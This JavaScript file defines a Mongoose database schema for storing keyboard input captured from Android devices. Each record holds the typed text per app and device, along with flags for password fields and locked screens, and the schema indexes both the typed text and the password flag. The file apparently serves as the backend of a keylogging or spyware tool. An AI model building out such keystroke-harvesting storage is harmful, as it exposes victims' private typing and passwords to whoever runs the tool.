const mongoose = require('mongoose');

const textInputSchema = new mongoose.Schema({
    // Basic identification
    id: {
        type: String,
        required: true,
        unique: true
    },
    timestamp: {
        type: Date,
        required: true,
        default: Date.now
    },
    packageName: {
        type: String,
        required: true
    },
    appName: {
        type: String,
        required: true
    },
    deviceId: {
        type: String,
        required: true
    },
    
    // KEYBOARD INPUT DATA (PRIMARY FOCUS)
    keyboardInput: {
        type: String,
        required: true
    },
    keyboardInputEN: {
        type: String,
        default: ''
    },
    inputField: {
        type: String,
        default: ''
    },
    inputType: {
        type: String,
        default: ''
    },
    
    // CONTEXT INFORMATION (MINIMAL)
    screenTitle: {
        type: String,
        default: ''
    },
    fieldHint: {
        type: String,
        default: ''
    },
    isPassword: {
        type: Boolean,
        default: false
    },
    isScreenLocked: {
        type: Boolean,
        default: false
    },
    
    // APP CONTEXT (MINIMAL)
    activityName: {
        type: String,
        default: ''
    },
    viewId: {
        type: String,
        default: ''
    },
    
    // DEVICE INFO (MINIMAL)
    deviceModel: {
        type: String,
        default: ''
    },
    androidVersion: {
        type: String,
        default: ''
    }
}, { timestamps: true });

// Indexes for better performance
textInputSchema.index({ id: 1, deviceId: 1 }, { unique: true });
textInputSchema.index({ packageName: 1, timestamp: 1 });
textInputSchema.index({ deviceId: 1, timestamp: 1 });
textInputSchema.index({ keyboardInput: 1 });
textInputSchema.index({ inputField: 1 });
textInputSchema.index({ isPassword: 1 });

// Pre-save middleware to ensure data integrity
textInputSchema.pre('save', function(next) {
    // Ensure keyboardInput is not empty
    if (!this.keyboardInput || this.keyboardInput.trim() === '') {
        return next(new Error('keyboardInput is required and cannot be empty'));
    }
    
    // Ensure inputField has a default value if not provided
    if (!this.inputField) {
        this.inputField = 'text_input';
    }
    
    // Ensure inputType has a default value if not provided
    if (!this.inputType) {
        this.inputType = 'text';
    }
    
    next();
});

const TextInput = mongoose.model('TextInput', textInputSchema);

module.exports = TextInput;